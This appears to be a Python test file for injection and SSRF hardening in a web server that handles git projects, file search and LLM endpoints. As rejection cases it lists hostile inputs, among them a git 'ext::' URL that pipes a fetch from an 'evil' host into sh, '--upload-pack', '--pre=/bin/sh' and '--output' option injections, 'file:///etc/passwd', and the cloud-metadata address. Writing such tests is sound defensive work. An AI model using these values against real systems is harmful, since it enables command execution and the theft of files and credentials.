"""Injection + SSRF hardening tests (epic #318, #323).

C5 git URL/branch validators, H5 ripgrep arg injection, H6 LLM base_url SSRF,
M3 git-diff option injection.
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi import HTTPException
from pydantic import ValidationError

_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_ROOT / "apps" / "web-server"))
sys.path.insert(0, str(_ROOT / "apps" / "backend"))

from server.routes.files import get_git_diff, search_files  # noqa: E402
from server.routes.llm_endpoints import _probe_models  # noqa: E402
from server.routes.projects import ProjectCreate  # noqa: E402
from server.services.url_safety import assert_safe_outbound_url  # noqa: E402

# ── C5: git URL / branch validators ────────────────────────────────────────


@pytest.mark.parametrize(
    "bad_url",
    [
        "ext::sh -c 'curl evil|sh'",
        "fd::17/foo",
        "--upload-pack=touch /tmp/pwned",
        "file:///etc/passwd",
        "git::https://evil/x",  # contains '::'
    ],
)
def test_giturl_rejects_dangerous(bad_url):
    with pytest.raises(ValidationError):
        ProjectCreate(gitUrl=bad_url)


@pytest.mark.parametrize(
    "ok_url",
    [
        "https://github.com/owner/repo.git",
        "ssh://git@github.com/owner/repo.git",
        "git@github.com:owner/repo.git",
    ],
)
def test_giturl_accepts_valid(ok_url):
    assert ProjectCreate(gitUrl=ok_url).gitUrl == ok_url


def test_branch_rejects_leading_dash():
    with pytest.raises(ValidationError):
        ProjectCreate(gitUrl="https://x/y.git", branch="--upload-pack=touch /tmp/x")


def test_branch_accepts_normal():
    assert (
        ProjectCreate(gitUrl="https://x/y.git", branch="feature/foo-1").branch
        == "feature/foo-1"
    )


# ── H6: SSRF guard ─────────────────────────────────────────────────────────


# These used to call llm_endpoints' own private `_assert_url_not_ssrf`. That
# copy is gone (#1265) and the route now uses the canonical guard, so the tests
# go through `_probe_models` instead: it is the wiring, not the helper, that
# these were really pinning, and a helper test would have stayed green if the
# route had stopped calling it.
@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/v1/models",
        "http://169.254.169.254/latest/meta-data/",  # cloud metadata
        "http://localhost:8000/",
        "http://10.0.0.5/",
        "http://[fd00:ec2::254]/",  # IPv6 instance metadata (unique-local)
        "file:///etc/passwd",  # bad scheme
    ],
)
def test_ssrf_blocks_unsafe(url):
    with patch("urllib.request.OpenerDirector.open") as opened:
        result = _probe_models(url, api_key=None, headers=None)
    assert result.ok is False
    # Refused before the socket, not after a failed connection.
    opened.assert_not_called()


def test_ssrf_allows_public(monkeypatch):
    monkeypatch.setattr(
        "socket.getaddrinfo",
        lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 443))],
    )
    assert_safe_outbound_url("https://example.com/v1/models")  # must not raise


# ── H5 / M3: ripgrep + git-diff arg injection ──────────────────────────────


@pytest.fixture
def project(tmp_path, monkeypatch):
    proj = tmp_path / "proj"
    (proj / ".git").mkdir(parents=True)
    monkeypatch.setattr(
        "server.routes.projects.load_projects", lambda: {"p": {"path": str(proj)}}
    )
    return proj


async def test_search_rejects_leading_dash_query(project):
    with pytest.raises(HTTPException) as exc:
        await search_files(
            project_id="p",
            query="--pre=/bin/sh",
            path="",
            file_pattern="*",
            max_results=10,
        )
    assert exc.value.status_code == 400


async def test_search_rejects_overlong_query(project):
    with pytest.raises(HTTPException) as exc:
        await search_files(
            project_id="p", query="a" * 2000, path="", file_pattern="*", max_results=10
        )
    assert exc.value.status_code == 400


async def test_git_diff_rejects_option_injection_base(project):
    with pytest.raises(HTTPException) as exc:
        await get_git_diff(project_id="p", path="", base="--output=/tmp/x")
    assert exc.value.status_code == 400
